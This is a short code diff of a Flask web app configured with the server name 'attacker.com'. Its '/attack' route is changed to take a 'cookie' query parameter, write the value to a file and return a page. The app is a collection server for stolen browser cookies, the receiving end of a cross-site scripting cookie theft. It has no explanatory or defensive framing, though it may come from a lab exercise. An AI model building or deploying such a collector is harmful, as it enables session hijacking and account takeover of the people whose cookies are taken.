@@ -4,16 +4,16 @@ from flask import request
 
 app = Flask(__name__, static_folder='static')
 
-app.config['SERVER_NAME'] = 'attacker.com'
+app.config['SERVER_NAME'] = 'attacker.com:5000'
 
 @app.route('/attack')
 def attack():
-	user = request.args.get('cookie')
+	cookie = request.args.get('cookie')
 	with open("test.txt","wb") as fo:
-   		fo.write("This is Test Data")
+   		fo.write(cookie)
+	return render_template('index.html')
 
 
 @app.route('/')
 def home_page():
     return render_template('index.html')
-
